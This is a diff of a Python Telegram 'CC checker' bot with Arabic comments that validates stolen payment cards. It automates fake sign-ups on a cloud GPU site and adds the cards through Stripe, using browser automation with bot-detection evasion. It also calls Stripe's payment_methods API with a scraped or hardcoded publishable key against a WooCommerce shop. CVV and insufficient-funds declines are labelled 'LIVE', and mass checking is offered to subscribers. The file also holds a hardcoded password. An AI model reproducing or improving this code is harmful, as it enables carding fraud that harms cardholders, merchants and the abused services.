@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 15.0 - Final with Real Gateway
+Version: 16.0 - Final with Vault Gateway
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -43,21 +43,10 @@ try:
     import telebot
     from telebot import types
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+    from playwright.async_api import async_playwright, Page
 except ImportError as e:
     print(f"❌ خطأ في استيراد المكتبات: {e}")
     sys.exit(1)
-
-# استيراد مكتبات Selenium
-try:
-    from selenium import webdriver
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
-    from selenium.common.exceptions import TimeoutException, NoSuchElementException
-except ImportError as e:
-    print(f"⚠️ Selenium غير مثبتة: {e}")
 
 # تجاهل التحذيرات
 warnings.filterwarnings("ignore")
@@ -95,34 +84,24 @@ GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")
 
 # ==================== إعدادات البوابات ====================
 GATES = {
-    "stripe1": {
-        "name": "💳 Stripe v1",
-        "description": "فحص بطاقات عبر بوابة Stripe الأولى",
-        "command": "st1",
-        "mass_command": "st1m",
+    "stripe": {
+        "name": "💳 Stripe Gateway",
+        "description": "فحص بطاقات عبر بوابة Stripe",
+        "command": "st",
+        "mass_command": "mass",
         "enabled": True,
         "timeout": 30,
         "icon": "💳",
         "default": True
     },
-    "stripe2": {
-        "name": "💎 Stripe v2",
-        "description": "فحص بطاقات عبر بوابة Stripe الثانية",
-        "command": "st2",
-        "mass_command": "st2m",
-        "enabled": True,
-        "timeout": 30,
-        "icon": "💎",
-        "default": False
-    },
-    "real": {
-        "name": "🔥 Real Check",
-        "description": "فحص بطاقات حقيقي عبر نظام متقدم",
+    "vault": {
+        "name": "⚡ Vault Gateway",
+        "description": "فحص بطاقات عبر بوابة متطورة",
         "command": "chk",
         "mass_command": "chkm",
         "enabled": True,
-        "timeout": 90,
-        "icon": "🔥",
+        "timeout": 45,
+        "icon": "⚡",
         "default": False
     }
 }
@@ -144,280 +123,6 @@ ua = UserAgent()
 
 # متغيرات عامة
 user_last_file = {}
-user_browsers = {}
-
-# ==================== بوابة الفحص الحقيقي ====================
-class RealGateway:
-    """Real Card Verification with Browser Automation"""
-    
-    def __init__(self):
-        self.user_browsers = {}
-        self.user_wait = {}
-        
-    def setup_driver_for_user(self, user_id: int) -> bool:
-        """Setup Chrome driver for specific user"""
-        try:
-            chrome_options = Options()
-            
-            # إعدادات Chrome للعمل في Docker
-            chrome_options.add_argument('--headless=new')
-            chrome_options.add_argument('--no-sandbox')
-            chrome_options.add_argument('--disable-dev-shm-usage')
-            chrome_options.add_argument('--disable-gpu')
-            chrome_options.add_argument('--window-size=1920,1080')
-            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-            chrome_options.add_argument('--disable-extensions')
-            chrome_options.add_argument('--disable-setuid-sandbox')
-            
-            # إخفاء أن selenium يتحكم بالمتصفح
-            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-            chrome_options.add_experimental_option('useAutomationExtension', False)
-            
-            # وكيل المستخدم
-            chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
-            
-            # إعدادات إضافية
-            prefs = {
-                "credentials_enable_service": False,
-                "profile.password_manager_enabled": False,
-                "profile.default_content_setting_values.notifications": 2
-            }
-            chrome_options.add_experimental_option("prefs", prefs)
-            
-            # مسار Chromium
-            chrome_options.binary_location = "/usr/bin/chromium"
-            
-            # إنشاء driver
-            service = Service(executable_path="/usr/bin/chromedriver")
-            driver = webdriver.Chrome(service=service, options=chrome_options)
-            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-            driver.set_page_load_timeout(60)
-            
-            self.user_browsers[user_id] = driver
-            self.user_wait[user_id] = WebDriverWait(driver, 30)
-            return True
-            
-        except Exception as e:
-            print(f"Driver error for user {user_id}: {e}")
-            return False
-    
-    def cleanup_user(self, user_id: int):
-        """Clean up browser for user"""
-        if user_id in self.user_browsers:
-            try:
-                self.user_browsers[user_id].quit()
-            except:
-                pass
-            del self.user_browsers[user_id]
-        if user_id in self.user_wait:
-            del self.user_wait[user_id]
-    
-    def generate_email(self) -> str:
-        """Generate random email"""
-        names = ["john", "mike", "david", "sarah", "emma", "alex", "chris", "jordan"]
-        numbers = random.randint(100, 9999)
-        return f"{random.choice(names)}.{numbers}@gmail.com"
-    
-    def human_type(self, driver, element, text):
-        """Human-like typing"""
-        for char in text:
-            element.send_keys(char)
-            time.sleep(random.uniform(0.05, 0.1))
-    
-    def human_click(self, driver, element):
-        """Human-like click"""
-        try:
-            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
-            time.sleep(0.3)
-            element.click()
-            time.sleep(0.5)
-        except:
-            element.click()
-            time.sleep(0.5)
-    
-    def create_account_real(self, user_id: int, email: str) -> bool:
-        """Real signup"""
-        driver = self.user_browsers.get(user_id)
-        wait = self.user_wait.get(user_id)
-        
-        if not driver:
-            return False
-        
-        try:
-            driver.get("https://cloud.vast.ai/create/")
-            time.sleep(5)
-            
-            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
-            time.sleep(2)
-            
-            # البحث عن زر Login
-            login_selectors = [
-                "//span[contains(text(), 'Login')]",
-                "//button[contains(text(), 'Login')]",
-                "//a[contains(text(), 'Login')]"
-            ]
-            
-            login_btn = None
-            for selector in login_selectors:
-                try:
-                    login_btn = wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
-                    if login_btn:
-                        break
-                except:
-                    continue
-            
-            if login_btn:
-                self.human_click(driver, login_btn)
-                time.sleep(3)
-            else:
-                return False
-            
-            # إدخال البريد الإلكتروني
-            email_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']")))
-            email_field.clear()
-            self.human_type(driver, email_field, email)
-            time.sleep(2)
-            
-            # إدخال كلمة المرور
-            password = "Obeida059@"
-            password_fields = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
-            if password_fields:
-                password_fields[0].clear()
-                self.human_type(driver, password_fields[0], password)
-                time.sleep(2)
-            
-            if len(password_fields) > 1:
-                password_fields[1].clear()
-                self.human_type(driver, password_fields[1], password)
-                time.sleep(2)
-            
-            # الضغط على زر التسجيل
-            signup_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "[data-testid='auth-submit-login-signup']")))
-            self.human_click(driver, signup_btn)
-            time.sleep(5)
-            
-            return True
-            
-        except Exception as e:
-            print(f"Account creation error: {e}")
-            return False
-    
-    def add_card_real(self, user_id: int, card_data: Dict) -> Tuple[bool, str]:
-        """Add card"""
-        driver = self.user_browsers.get(user_id)
-        wait = self.user_wait.get(user_id)
-        
-        if not driver:
-            return False, "Browser not initialized"
-        
-        try:
-            driver.get("https://cloud.vast.ai/billing/")
-            time.sleep(5)
-            
-            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
-            time.sleep(3)
-            
-            # البحث عن زر Add Card
-            add_card_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Add Card')]")))
-            self.human_click(driver, add_card_btn)
-            time.sleep(5)
-            
-            # البحث عن iframe الخاص بـ Stripe
-            iframes = driver.find_elements(By.TAG_NAME, "iframe")
-            for iframe in iframes:
-                try:
-                    driver.switch_to.frame(iframe)
-                    if driver.find_elements(By.ID, "cardNumber"):
-                        break
-                    driver.switch_to.default_content()
-                except:
-                    driver.switch_to.default_content()
-                    continue
-            
-            time.sleep(2)
-            
-            # إدخال بيانات البطاقة
-            card_input = wait.until(EC.presence_of_element_located((By.ID, "cardNumber")))
-            card_input.click()
-            card_input.clear()
-            self.human_type(driver, card_input, card_data['number'])
-            time.sleep(2)
-            
-            expiry_input = driver.find_element(By.ID, "cardExpiry")
-            expiry_input.click()
-            expiry_input.clear()
-            self.human_type(driver, expiry_input, f"{card_data['month']}{card_data['year']}")
-            time.sleep(2)
-            
-            cvc_input = driver.find_element(By.ID, "cardCvc")
-            cvc_input.click()
-            cvc_input.clear()
-            self.human_type(driver, cvc_input, card_data['cvv'])
-            time.sleep(2)
-            
-            name_input = driver.find_element(By.ID, "billingName")
-            name_input.click()
-            name_input.clear()
-            names = ["Michael Johnson", "Sarah Williams", "David Brown", "John Smith"]
-            self.human_type(driver, name_input, random.choice(names))
-            time.sleep(1)
-            
-            country_input = driver.find_element(By.ID, "billingCountry")
-            country_input.click()
-            country_input.clear()
-            self.human_type(driver, country_input, "US")
-            time.sleep(1)
-            
-            postal_input = driver.find_element(By.ID, "billingPostalCode")
-            postal_input.click()
-            postal_input.clear()
-            self.human_type(driver, postal_input, "10001")
-            time.sleep(2)
-            
-            submit_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div.SubmitButton-IconContainer")))
-            self.human_click(driver, submit_btn)
-            time.sleep(8)
-            
-            driver.switch_to.default_content()
-            time.sleep(3)
-            
-            # البحث عن رسائل الخطأ
-            errors = driver.find_elements(By.CSS_SELECTOR, ".Error, .error, [role='alert']")
-            for error in errors:
-                if error.is_displayed() and error.text:
-                    error_text = error.text.lower()
-                    if "cvv" in error_text:
-                        return True, "💳 CVV ERROR - Card is LIVE"
-                    elif "insufficient" in error_text:
-                        return True, "💰 INSUFFICIENT FUNDS - Card is LIVE"
-                    elif "stolen" in error_text:
-                        return True, "⚠️ RISK CARD - Card is LIVE"
-                    return False, f"❌ {error.text[:50]}"
-            
-            return True, "✅ CARD APPROVED - Successfully added"
-            
-        except Exception as e:
-            driver.switch_to.default_content()
-            return False, f"⚠️ Error: {str(e)[:50]}"
-    
-    async def process_card(self, user_id: int, card_data: Dict) -> Tuple[bool, str]:
-        """Process single card"""
-        try:
-            if user_id not in self.user_browsers:
-                if not self.setup_driver_for_user(user_id):
-                    return False, "❌ Browser initialization failed"
-            
-            email = self.generate_email()
-            
-            if not self.create_account_real(user_id, email):
-                return False, "❌ Account creation failed"
-            
-            success, message = self.add_card_real(user_id, card_data)
-            
-            return success, message
-            
-        except Exception as e:
-            return False, f"⚠️ System Error: {str(e)[:50]}"
 
 # ==================== إدارة البيانات ====================
 class DataManager:
@@ -436,7 +141,7 @@ class DataManager:
                     "is_subscribed": True,
                     "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                     "usage": {"total_checks": 0, "approved": 0, "declined": 0},
-                    "default_gate": "stripe1"
+                    "default_gate": "stripe"
                 }
             DataManager.save_json(USERS_FILE, users)
         
@@ -457,7 +162,8 @@ class DataManager:
                 "auto_clean": True,
                 "clean_days": 30,
                 "maintenance_mode": False,
-                "default_check_gate": "stripe1",
+                "maintenance_message": "البوت تحت الصيانة حالياً",
+                "default_check_gate": "stripe",
                 "group_mode": True,
                 "require_sub_in_groups": True,
                 "delay_between_cards": 5
@@ -511,7 +217,7 @@ class DataManager:
             if "subscription" not in user:
                 user["subscription"] = {"active": False}
             if "default_gate" not in user:
-                user["default_gate"] = "stripe1"
+                user["default_gate"] = "stripe"
         
         return users
     
@@ -522,13 +228,7 @@ class DataManager:
     @staticmethod
     def load_stats() -> Dict:
         DataManager.init_files()
-        stats = DataManager.load_json(STATS_FILE, {
-            "total_checks": 0,
-            "total_approved": 0,
-            "total_declined": 0,
-            "gates_usage": {},
-            "daily_stats": {}
-        })
+        stats = DataManager.load_json(STATS_FILE, {})
         
         defaults = {
             "total_checks": 0,
@@ -557,7 +257,7 @@ class DataManager:
             "auto_clean": True,
             "clean_days": 30,
             "maintenance_mode": False,
-            "default_check_gate": "stripe1",
+            "default_check_gate": "stripe",
             "group_mode": True,
             "require_sub_in_groups": True,
             "delay_between_cards": 5
@@ -641,7 +341,7 @@ class DataManager:
     def get_user_default_gate(user_id: int) -> str:
         users = DataManager.load_users()
         user = users.get(str(user_id), {})
-        return user.get("default_gate", "stripe1")
+        return user.get("default_gate", "stripe")
     
     @staticmethod
     def set_user_default_gate(user_id: int, gate: str) -> bool:
@@ -672,14 +372,8 @@ class DataManager:
         
         expiry = datetime.now() + timedelta(days=days)
         
-        plan_name = "مخصص"
-        for plan_key, plan in SUBSCRIPTION_PLANS.items():
-            if plan["duration"] == days:
-                plan_name = plan["name"]
-                break
-        
         users[uid]["subscription"] = {
-            "plan": plan_name,
+            "plan": f"{days} يوم",
             "expiry": expiry.isoformat(),
             "active": True,
             "added_by": "admin",
@@ -711,7 +405,7 @@ class DataManager:
             }
         
         is_approved = any(x in result for x in [
-            "✅", "LIVE", "Approved", "approved", "CHARGED",
+            "✅", "LIVE", "Approved", "approved", "مقبولة",
             "CVV ERROR", "INSUFFICIENT", "RISK CARD"
         ])
         
@@ -835,7 +529,8 @@ class Helpers:
                                 'month': month,
                                 'year': year,
                                 'cvv': cvv,
-                                'original': card_str
+                                'original': card_str,
+                                'name': parts[4] if len(parts) > 4 else "Card Holder"
                             }
             return None
         except:
@@ -930,30 +625,23 @@ class ResultFormatter:
     def format_card_result(card: str, result: str, is_approved: bool) -> str:
         number = card.split('|')[0] if '|' in card else card
         masked = f"{number[:6]}xxxxxx{number[-4:]}"
-        status_text = "LIVE" if is_approved else "DECLINED"
+        status_text = "✅ LIVE" if is_approved else "❌ DECLINED"
         
-        if "insufficient" in result.lower():
-            status_text = "LIVE - INSUFFICIENT FUNDS"
-        elif "cvv" in result.lower():
-            status_text = "LIVE - CVV ERROR"
-        elif "stolen" in result.lower() or "risk" in result.lower():
-            status_text = "LIVE - RISK CARD"
-        elif "charged" in result.lower():
-            status_text = "CHARGED"
+        if "cvv" in result.lower():
+            status_text = "💳 LIVE - CVV ERROR"
+        elif "insufficient" in result.lower():
+            status_text = "💰 LIVE - INSUFFICIENT"
         
         return f"""
 𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
-𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text} | {result}
+𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text}
 """
     
     @staticmethod
-    def format_mass_result_footer(approved: int, declined: int, total: int, remaining: int = None) -> str:
-        if remaining is None:
-            remaining = 0
+    def format_mass_result_footer(approved: int, declined: int, total: int) -> str:
         return f"""
 𒊹︎︎︎ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ⌁ {approved}
 𒊹︎︎︎ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ⌁ {declined}
-𒊹︎︎︎ 𝗥𝗘𝗠𝗔𝗜𝗡 ♻️ ⌁ {remaining}
 
 𝗧𝗢𝗧𝗔𝗟 💀 ➺ [ {total} ]
 ━━━━━━━━━━━━
@@ -966,14 +654,10 @@ class ResultFormatter:
         masked = f"{number[:6]}xxxxxx{number[-4:]}"
         
         if is_approved:
-            if "charged" in result.lower():
-                status_text = "✅ CHARGED - Payment Successful"
-            elif "cvv" in result.lower():
+            if "cvv" in result.lower():
                 status_text = "💳 LIVE - CVV ERROR"
             elif "insufficient" in result.lower():
                 status_text = "💰 LIVE - INSUFFICIENT FUNDS"
-            elif "stolen" in result.lower() or "risk" in result.lower():
-                status_text = "⚠️ LIVE - RISK CARD"
             else:
                 status_text = "✅ LIVE - CARD APPROVED"
         else:
@@ -983,7 +667,6 @@ class ResultFormatter:
             bin_text = f"""
 𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}
 𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}
-𒊹︎︎︎ 𝗧𝗬𝗣𝗘 ⌁ {bin_info.get('type', 'Unknown')}
 𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}
 𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
 """
@@ -1000,110 +683,32 @@ class ResultFormatter:
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 🆔 Obeida Online | @ObeidaTrading
 """
-    
-    @staticmethod
-    def get_loading_animation(frame: int) -> str:
-        frames = ["◐", "◓", "◑", "◒"]
-        return frames[frame % len(frames)]
 
-# ==================== بوابة Stripe 1 ====================
-class StripeGateway1:
-    """Stripe Gateway 1 - SetupIntent Auth"""
-    
-    @staticmethod
-    def normalize_url(url):
-        url = url.strip()
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        url = url.rstrip('/')
-        if '/my-account' not in url.lower():
-            url += '/my-account'
-        if not url.endswith('/'):
-            url += '/'
-        return url
+# ==================== بوابة Stripe ====================
+class StripeGateway:
     
     @staticmethod
     def generate_random_email():
         username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
         number = random.randint(100, 9999)
-        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+        domains = ['gmail.com', 'yahoo.com', 'outlook.com']
         return f"{username}{number}@{random.choice(domains)}"
     
-    @staticmethod
-    def generate_guid():
-        return str(uuid.uuid4())
-    
-    @staticmethod
-    def gets(s, start, end):
+    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
         try:
-            start_index = s.index(start) + len(start)
-            end_index = s.index(end, start_index)
-            return s[start_index:end_index]
-        except (ValueError, AttributeError):
-            return None
-    
-    async def process_card(self, site_url: str, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            site_url = self.normalize_url(site_url or "https://copenhagensilver.com")
-            timeout = aiohttp.ClientTimeout(total=70)
+            site_url = "https://copenhagensilver.com/my-account/"
+            timeout = aiohttp.ClientTimeout(total=60)
             connector = aiohttp.TCPConnector(ssl=False)
             
             async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-                parsed = urlparse(site_url)
-                domain = f"{parsed.scheme}://{parsed.netloc}"
-                email = self.generate_random_email()
-                
                 random_ua = ua.random
-                
-                headers = {
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                    'user-agent': random_ua
-                }
+                headers = {'user-agent': random_ua}
                 
                 resp = await session.get(site_url, headers=headers)
-                resp_text = await resp.text()
+                text = await resp.text()
                 
-                register_nonce = (self.gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
-                                 self.gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
-                                 self.gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
-                
-                if register_nonce:
-                    username = email.split('@')[0]
-                    password = f"Pass{random.randint(100000, 999999)}!"
-                    
-                    register_data = {
-                        'email': email,
-                        'password': password,
-                        'woocommerce-register-nonce': register_nonce,
-                        'register': 'Register',
-                        '_wp_http_referer': '/my-account/'
-                    }
-                    
-                    await session.post(site_url, headers=headers, data=register_data)
-                
-                add_payment_url = f"{domain}/my-account/add-payment-method/"
-                resp = await session.get(add_payment_url, headers={'user-agent': random_ua})
-                payment_page_text = await resp.text()
-                
-                add_card_nonce = (self.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
-                                 self.gets(payment_page_text, 'add_card_nonce":"', '"') or 
-                                 self.gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
-                                 self.gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
-                
-                stripe_key = (self.gets(payment_page_text, '"key":"pk_', '"') or 
-                             self.gets(payment_page_text, 'data-key="pk_', '"') or 
-                             self.gets(payment_page_text, 'stripe_key":"pk_', '"') or 
-                             self.gets(payment_page_text, 'publishable_key":"pk_', '"'))
-                
-                if not stripe_key:
-                    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
-                    if pk_match:
-                        stripe_key = pk_match.group(0)
-                
-                if not stripe_key:
-                    stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
-                elif not stripe_key.startswith('pk_'):
-                    stripe_key = 'pk_' + stripe_key
+                stripe_key = re.search(r'pk_(live|test)_[a-zA-Z0-9]{24,}', text)
+                stripe_key = stripe_key.group(0) if stripe_key else 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                 
                 stripe_headers = {
                     'accept': 'application/json',
@@ -1119,23 +724,8 @@ class StripeGateway1:
                     'card[cvc]': card_data['cvv'],
                     'card[exp_month]': card_data['month'],
                     'card[exp_year]': card_data['year'],
-                    'allow_redisplay': 'unspecified',
-                    'billing_details[address][country]': 'AU',
-                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
-                    'referrer': domain,
-                    'client_attribution_metadata[client_session_id]': self.generate_guid(),
-                    'client_attribution_metadata[merchant_integration_source]': 'elements',
-                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-                    'client_attribution_metadata[merchant_integration_version]': '2021',
-                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-                    'client_attribution_metadata[elements_session_config_id]': self.generate_guid(),
-                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
-                    'guid': self.generate_guid(),
-                    'muid': self.generate_guid(),
-                    'sid': self.generate_guid(),
-                    'key': stripe_key,
-                    '_stripe_version': '2024-06-20'
+                    'billing_details[address][country]': 'US',
+                    'key': stripe_key
                 }
                 
                 pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
@@ -1143,95 +733,107 @@ class StripeGateway1:
                 
                 if 'error' in pm_json:
                     err = pm_json['error']
-                    code = err.get('decline_code', '') or err.get('code', '')
+                    code = err.get('decline_code', '')
                     
                     if code in ['incorrect_cvc', 'invalid_cvc']:
-                        return True, "💳 CCN LIVE - CVV ERROR"
+                        return True, "💳 CVV ERROR"
                     elif code == 'insufficient_funds':
-                        return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+                        return True, "💰 INSUFFICIENT FUNDS"
                     elif code in ['stolen_card', 'lost_card']:
-                        return True, "⚠️ CCN LIVE - RISK CARD"
-                    elif 'payment_method' in pm_json:
-                        return True, "✅ CARD APPROVED - TOKEN CREATED"
-                    return False, f"❌ {err.get('message', 'DECLINED')[:50]}"
+                        return True, "⚠️ RISK CARD"
+                    return False, f"❌ {err.get('message', 'DECLINED')[:40]}"
                 
-                pm_id = pm_json.get('id')
-                if not pm_id:
-                    return False, "❌ Failed to create Payment Method"
-                
-                confirm_headers = {
-                    'accept': 'application/json, text/javascript, */*; q=0.01',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': domain,
-                    'x-requested-with': 'XMLHttpRequest',
-                    'user-agent': random_ua
-                }
-                
-                endpoints = [
-                    {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 
-                     'data': {'wc-stripe-payment-method': pm_id}},
-                    {'url': f"{domain}/wp-admin/admin-ajax.php", 
-                     'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
-                    {'url': f"{domain}/?wc-ajax=add_payment_method", 
-                     'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
-                ]
-                
-                for endp in endpoints:
-                    if not add_card_nonce:
-                        continue
-                    if 'add_payment_method' in endp['url']:
-                        endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
-                    else:
-                        endp['data']['_ajax_nonce'] = add_card_nonce
-                    endp['data']['wc-stripe-payment-type'] = 'card'
-                    
-                    try:
-                        res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
-                        text = await res.text()
-                        if 'success' in text:
-                            js = json.loads(text)
-                            if js.get('success'):
-                                status = js.get('data', {}).get('status')
-                                return True, f"✅ Approved (Status: {status})"
-                            else:
-                                error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
-                                return False, f"❌ {error_msg}"
-                    except:
-                        continue
-                
-                return False, "❌ Failed to confirm"
+                return True, "✅ APPROVED"
                 
         except Exception as e:
-            return False, f"⚠️ System Error: {str(e)[:50]}"
+            return False, f"⚠️ خطأ: {str(e)[:40]}"
 
-# ==================== بوابة Stripe 2 ====================
-class StripeGateway2(StripeGateway1):
-    """Stripe Gateway 2"""
+# ==================== بوابة Vault ====================
+class VaultGateway:
     
-    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
-        return await super().process_card("https://copenhagensilver.com", card_data)
+    def __init__(self):
+        self.device = {
+            'viewport': {'width': 390, 'height': 844},
+            'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+        }
+    
+    def generate_random_email(self) -> str:
+        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        return f"{random_string}@gmail.com"
+    
+    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
+        """فحص بطاقة عبر البوابة المتطورة"""
+        try:
+            async with async_playwright() as p:
+                browser = await p.chromium.launch(headless=True)
+                context = await browser.new_context(
+                    viewport=self.device['viewport'],
+                    user_agent=self.device['user_agent']
+                )
+                page = await context.new_page()
+                
+                email = self.generate_random_email()
+                password = "Obeida059@"
+                
+                await page.goto("https://cloud.vast.ai/create/", timeout=30000)
+                await page.wait_for_timeout(2000)
+                
+                await page.locator('[data-testid="vast-main-login-button"]').click()
+                await page.wait_for_timeout(2000)
+                
+                await page.locator('#\\:r12\\:').fill(email)
+                await page.locator('#\\:r14\\:').fill(password)
+                await page.locator('#\\:r15\\:').fill(password)
+                await page.locator('div.MuiDialog-root label:nth-of-type(1) input').click()
+                await page.locator('[data-testid="auth-submit-login-signup"]').click()
+                await page.wait_for_timeout(3000)
+                
+                await page.locator('div:nth-of-type(2) > li:nth-of-type(1) span.vast-typography').click()
+                await page.wait_for_timeout(2000)
+                await page.locator('[data-testid="billing-page-payment-methods-add-card-button"]').click()
+                await page.wait_for_timeout(5000)
+                
+                expiry = f"{card_data['month']}/{card_data['year']}"
+                name = card_data.get('name', 'Card Holder')
+                
+                await page.locator("#cardNumber").fill(card_data['number'])
+                await page.locator("#cardExpiry").fill(expiry)
+                await page.locator("#cardCvc").fill(card_data['cvv'])
+                await page.locator("#billingName").fill(name)
+                await page.locator("#billingCountry").fill("US")
+                await page.locator("#billingPostalCode").fill("90003")
+                
+                await page.locator('div.SubmitButton-IconContainer').click()
+                
+                try:
+                    await page.wait_for_url(lambda url: 'billing?session_id=' in url, timeout=15000)
+                    await browser.close()
+                    return True, "✅ البطاقة مقبولة"
+                except Exception:
+                    current_url = page.url
+                    await browser.close()
+                    
+                    if 'stripe.com' in current_url:
+                        return True, "💳 CVV ERROR - البطاقة حية"
+                    else:
+                        return False, "❌ البطاقة مرفوضة"
+                        
+        except Exception as e:
+            return False, f"⚠️ خطأ: {str(e)[:40]}"
 
 # ==================== بوابات الفحص ====================
 class RealGateways:
     def __init__(self):
-        self.gateway1 = StripeGateway1()
-        self.gateway2 = StripeGateway2()
-        self.real = RealGateway()
+        self.stripe = StripeGateway()
+        self.vault = VaultGateway()
     
-    async def check_card(self, gate: str, card: Dict, user_id: int = None, site_url: str = None) -> Tuple[bool, str]:
-        if gate == 'stripe1':
-            return await self.gateway1.process_card(site_url, card)
-        elif gate == 'stripe2':
-            return await self.gateway2.process_card(card)
-        elif gate == 'real':
-            if user_id:
-                return await self.real.process_card(user_id, card)
-            return False, "❌ User ID required"
+    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
+        if gate == 'stripe':
+            return await self.stripe.process_card(card)
+        elif gate == 'vault':
+            return await self.vault.check_card(card)
         else:
             return False, "❌ بوابة غير مدعومة"
-    
-    def cleanup_user(self, user_id: int):
-        self.real.cleanup_user(user_id)
 
 # ==================== مدير الفحص المتعدد ====================
 class MassCheckManager:
@@ -1298,9 +900,8 @@ class UserInterface:
         
         if chat_type == "private":
             btns = [
-                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
-                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
-                InlineKeyboardButton("🔥 Real Check", callback_data="gate_real"),
+                InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
+                InlineKeyboardButton("⚡ Vault", callback_data="gate_vault"),
                 InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                 InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                 InlineKeyboardButton("⏱️ ضبط المدة", callback_data="set_delay"),
@@ -1312,9 +913,8 @@ class UserInterface:
             ]
         else:
             btns = [
-                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
-                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
-                InlineKeyboardButton("🔥 Real Check", callback_data="gate_real"),
+                InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
+                InlineKeyboardButton("⚡ Vault", callback_data="gate_vault"),
                 InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
